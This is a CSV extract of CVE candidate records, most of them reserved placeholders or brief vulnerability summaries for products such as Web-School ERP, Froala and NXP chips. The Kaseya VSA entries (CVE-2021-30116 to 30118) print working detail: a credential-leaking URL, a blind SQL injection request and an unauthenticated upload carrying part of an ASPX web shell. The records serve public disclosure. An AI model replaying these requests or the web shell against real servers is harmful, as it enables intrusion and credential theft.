"Name","Status","Description","References","Phase","Votes","Comments"
CVE-2021-30098,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30099,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-3010,Candidate,"There are multiple persistent cross-site scripting (XSS) vulnerabilities in the web interface of OpenText Content Server Version 20.3. The application allows a remote attacker to introduce arbitrary JavaScript by crafting malicious form values that are later not sanitized.","MISC:https://www.exploit-db.com/exploits/49578   |   MISC:https://www.opentext.com/products-and-solutions/products/enterprise-content-management/content-management",Assigned (20210104),"None (candidate not yet proposed)",""
CVE-2021-30100,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30101,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30102,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30103,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30104,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30105,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30106,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30107,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30108,Candidate,"Feehi CMS 2.1.1 is affected by a Server-side request forgery (SSRF) vulnerability. When the user modifies the HTTP Referer header to any url, the server can make a request to it.","MISC:https://github.com/liufee/cms/issues/57",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30109,Candidate,"Froala Editor 3.2.6 is affected by Cross Site Scripting (XSS). Under certain conditions, a base64 crafted string leads to persistent Cross-site scripting (XSS) vulnerability within the hyperlink creation module.","MISC:http://froala.com   |   MISC:https://github.com/Hackdwerg/CVE-2021-30109/blob/main/README.md",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-3011,Candidate,"An electromagnetic-wave side-channel issue was discovered on NXP SmartMX / P5x security microcontrollers and A7x secure authentication microcontrollers, with CryptoLib through v2.9. It allows attackers to extract the ECDSA private key after extensive physical access (and consequently produce a clone). This was demonstrated on the Google Titan Security Key, based on an NXP A7005a chip. Other FIDO U2F security keys are also impacted (Yubico YubiKey Neo and Feitian K9, K13, K21, and K40) as well as several NXP JavaCard smartcards (J3A081, J2A081, J3A041, J3D145_M59, J2D145_M59, J3D120_M60, J3D082_M60, J2D120_M60, J2D082_M60, J3D081_M59, J2D081_M59, J3D081_M61, J2D081_M61, J3D081_M59_DF, J3D081_M61_DF, J3E081_M64, J3E081_M66, J2E081_M64, J3E041_M66, J3E016_M66, J3E016_M64, J3E041_M64, J3E145_M64, J3E120_M65, J3E082_M65, J2E145_M64, J2E120_M65, J2E082_M65, J3E081_M64_DF, J3E081_M66_DF, J3E041_M66_DF, J3E016_M66_DF, J3E041_M64_DF, and J3E016_M64_DF).","MISC:https://ninjalab.io/a-side-journey-to-titan/   |   MISC:https://ninjalab.io/wp-content/uploads/2021/01/a_side_journey_to_titan.pdf",Assigned (20210104),"None (candidate not yet proposed)",""
CVE-2021-30110,Candidate,"dttray.exe in Greyware Automation Products Inc Domain Time II before 5.2.b.20210331 allows remote attackers to execute arbitrary code via a URL to a malicious update in a spoofed response to the UDP query used to check for updates.","MISC:https://blog.grimm-co.com/2021/04/time-for-upgrade.html   |   MISC:https://www.greyware.com/software/domaintime/   |   MISC:https://www.greyware.com/software/domaintime/v5/installation/v5x.asp#currentVersion",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30111,Candidate,"A stored XSS vulnerability exists in Web-School ERP V 5.0 via (Add Events) in the event name and description fields. An attack can inject a JavaScript code that will be stored in the page. If any visitor sees the events, then the payload will be executed.","MISC:http://web-school.in   |   MISC:https://github.com/0xrayan/CVEs/issues/4   |   MISC:https://web-school.in/try-demo/",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30112,Candidate,"Web-School ERP V 5.0 contains a cross-site request forgery (CSRF) vulnerability that allows a remote attacker to create a student_leave_application request through module/core/studentleaveapplication/create. The application fails to validate the CSRF token for a POST request using Guardian privilege.","MISC:http://web-school.in   |   MISC:https://github.com/0xrayan/CVEs/issues/3   |   MISC:https://web-school.in/try-demo/",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30113,Candidate,"A blind XSS vulnerability exists in Web-School ERP V 5.0 via (Add Events) in event name and description fields. An attacker can inject a JavaScript code that will be stored in the page. If any visitor sees the event, then the payload will be executed and sends the victim's information to the attacker website.","MISC:http://web-school.in   |   MISC:https://github.com/0xrayan/CVEs/issues/1   |   MISC:https://web-school.in/try-demo/",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30114,Candidate,"Web-School ERP V 5.0 contains a cross-site request forgery (CSRF) vulnerability that allows a remote attacker to create a voucher payment request through module/accounting/voucher/create. The application fails to validate the CSRF token for a POST request using admin privilege.","MISC:http://web-school.in   |   MISC:https://github.com/0xrayan/CVEs/issues/2   |   MISC:https://web-school.in/try-demo/",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30115,Candidate,"** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.","",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30116,Candidate,"Kaseya VSA before 9.5.7 allows credential disclosure, as exploited in the wild in July 2021. By default Kaseya VSA on premise offers a download page where the clients for the installation can be downloaded. The default URL for this page is https://x.x.x.x/dl.asp When an attacker download a client for Windows and installs it, the file KaseyaD.ini is generated (C:\Program Files (x86)\Kaseya\XXXXXXXXXX\KaseyaD.ini) which contains an Agent_Guid and AgentPassword This Agent_Guid and AgentPassword can be used to log in on dl.asp (https://x.x.x.x/dl.asp?un=840997037507813&pw=113cc622839a4077a84837485ced6b93e440bf66d44057713cb2f95e503a06d9) This request authenticates the client and returns a sessionId cookie that can be used in subsequent attacks to bypass authentication. Security issues discovered --- * Unauthenticated download page leaks credentials * Credentials of agent software can be used to obtain a sessionId (cookie) that can be used for services not intended for use by agents * dl.asp accepts credentials via a GET request * Access to KaseyaD.ini gives an attacker access to sufficient information to penetrate the Kaseya installation and its clients. Impact --- Via the page /dl.asp enough information can be obtained to give an attacker a sessionId that can be used to execute further (semi-authenticated) attacks against the system.","CONFIRM:https://csirt.divd.nl/2021/07/04/Kaseya-Case-Update-2/   |   URL:https://csirt.divd.nl/2021/07/04/Kaseya-Case-Update-2/   |   CONFIRM:https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/   |   URL:https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/   |   CONFIRM:https://helpdesk.kaseya.com/hc/en-gb/articles/4403440684689-Important-Notice-July-2nd-2021   |   URL:https://helpdesk.kaseya.com/hc/en-gb/articles/4403440684689-Important-Notice-July-2nd-2021",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30117,Candidate,"The API call /InstallTab/exportFldr.asp is vulnerable to a semi-authenticated boolean-based blind SQL injection in the parameter fldrId. Detailed description --- Given the following request: ``` GET /InstallTab/exportFldr.asp?fldrId=1&#8217; HTTP/1.1 Host: 192.168.1.194 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Cookie: ASPSESSIONIDCQACCQCA=MHBOFJHBCIPCJBFKEPEHEDMA; sessionId=30548861; agentguid=840997037507813; vsaUser=scopeId=3&roleId=2; webWindowId=59091519; ``` Where the sessionId cookie value has been obtained via CVE-2021-30116. The result should be a failure. Response: ``` HTTP/1.1 500 Internal Server Error Cache-Control: private Content-Type: text/html; Charset=Utf-8 Date: Thu, 01 Apr 2021 19:12:11 GMT Strict-Transport-Security: max-age=63072000; includeSubDomains Connection: close Content-Length: 881 <!DOCTYPE html> <HTML> <HEAD> <title>Whoops.</title> <meta http-equiv=""X-UA-Compatible"" content=""IE=Edge"" /> <link id=""favIcon"" rel=""shortcut icon"" href=""/themes/default/images/favicon.ico?307447361""></link> ----SNIP---- ``` However when fldrId is set to &#8216;(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END))&#8217; the request is allowed. Request: ``` GET /InstallTab/exportFldr.asp?fldrId=%28SELECT%20%28CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%29 HTTP/1.1 Host: 192.168.1.194 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Cookie: ASPSESSIONIDCQACCQCA=MHBOFJHBCIPCJBFKEPEHEDMA; sessionId=30548861; agentguid=840997037507813; vsaUser=scopeId=3&roleId=2; webWindowId=59091519; ``` Response: ``` HTTP/1.1 200 OK Cache-Control: private Content-Type: text/html; Charset=Utf-8 Date: Thu, 01 Apr 2021 17:33:53 GMT Strict-Transport-Security: max-age=63072000; includeSubDomains Connection: close Content-Length: 7960 <html> <head> <title>Export Folder</title> <style> ------ SNIP ----- ```","CONFIRM:https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021   |   URL:https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021   |   MISC:https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/   |   URL:https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/",Assigned (20210402),"None (candidate not yet proposed)",""
CVE-2021-30118,Candidate,"An attacker can upload files with the privilege of the Web Server process for Kaseya VSA Unified Remote Monitoring & Management (RMM) 9.5.4.2149 and subsequently use these files to execute asp commands The api /SystemTab/uploader.aspx is vulnerable to an unauthenticated arbitrary file upload leading to RCE. An attacker can upload files with the privilege of the Web Server process and subsequently use these files to execute asp commands. Detailed description --- Given the following request: ``` POST /SystemTab/uploader.aspx?Filename=shellz.aspx&PathData=C%3A%5CKaseya%5CWebPages%5C&__RequestValidationToken=ac1906a5-d511-47e3-8500-47cc4b0ec219&qqfile=shellz.aspx HTTP/1.1 Host: 192.168.1.194 Cookie: sessionId=92812726; %5F%5FRequestValidationToken=ac1906a5%2Dd511%2D47e3%2D8500%2D47cc4b0ec219 Content-Length: 12 <%@ Page Language=""C#"" Debug=""true"" validateRequest=""false"" %> <%@ Import namespace=""System.Web.UI.WebControls"" %> <%@ Import namespace=""System.Diagnostics"" %> <%@ Import namespace=""System.IO"" %> <%@ Import namespace=""System"" %> <%@ Import namespace=""System.Data"" %> <%@ Import namespace=""System.Data.SqlClient"" %> <%@ Import namespace=""System.Security.AccessControl"" %> <%@ Import namespace=""System.Security.Principal"" %> <%@ Import namespace=""System.Collections.Generic"" %> <%@ Import namespace=""System.Collections"" %> <script runat=""server""> private const string password = ""pass""; // The password ( pass ) private const string style = ""dark""; // The style ( light / dark ) protected void Page_Load(object sender, EventArgs e) { //this.Remote(password); this.Login(password); this.Style(); this.ServerInfo(); <snip> ``` The attacker can control the name of the file written via the qqfile parameter and the location of the file written via the PathData parameter. Even though the call requires that a sessionId cookie is passed we have determined that the sessionId is not actually validated and any numeric value is accepted as valid. Security issues discovered --- * a sessionId cookie is required by /SystemTab/uploader.aspx, but is not actually validated, allowing an attacker to bypass authentication * /SystemTab/uploader.aspx allows an attacker to create a file with arbitrary content in any place the webserver has write access * The web server process has write access to the webroot where the attacker can execute it by requesting the URL of the newly created file. Impact --- This arbitrary file upload allows an attacker to place files of his own choosing on any location on the hard drive of the server the webserver process has access to, including (but not limited to) the webroot. If the attacker uploads files with code to the webroot (e.g. aspx code) he can then execute this code in the context of the webserver to breach either the integrity, confidentiality, or availability of the system or to steal credentials of other users. In other words, this can lead to a full system compromise.","CONFIRM:https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/   |   URL:https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/   |   CONFIRM:https://csirt.divd.nl/CVE-2021-30118   |   URL:https://csirt.divd.nl/CVE-2021-30118   |   CONFIRM:https://csirt.divd.nl/DIVD-2021-00011   |   URL:https://csirt.divd.nl/DIVD-2021-00011   |   CONFIRM:https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021   |   URL:https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021",Assigned (20210402),"None (candidate not yet proposed)",""
